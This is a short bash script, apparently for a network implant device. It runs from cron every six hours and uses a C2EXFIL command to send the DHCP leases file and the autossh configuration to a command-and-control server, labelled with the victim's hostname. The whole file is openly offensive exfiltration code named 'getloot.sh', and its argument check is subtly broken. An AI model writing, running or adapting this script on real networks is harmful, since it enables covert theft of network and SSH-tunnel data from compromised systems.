#!/bin/bash
# Grabs somethings and exfils to c2
# every 6 hours
# 0 */6 * * * * bash /root/scripts/getloot.sh

## vars
dhcplog="/var/dhcp.leases"
file_array=(
  '/var/dhcp.leases'
  '/etc/config/autossh'
)

## functions
exfil() {
  if [ $2="" ]
  then
    source="misc"
  else
    source="$2"
  fi

  C2EXFIL STRING $1 ${HOSTNAME}-$source

}

## look at me go!
# loop thru the array of files!
for file in "${file_array[@]}"
do
    size=$(wc -c <"$file")
    if [ $size -gt 0 ]
    then
    if [ -f $file ]
      then
        exfil $file
      fi
    fi
done


# copy our dhcp leases file
# if [ -f ${dhcplog} ]
#   then
#     exfil /var/cc-client-error.log dhcplease
# fi
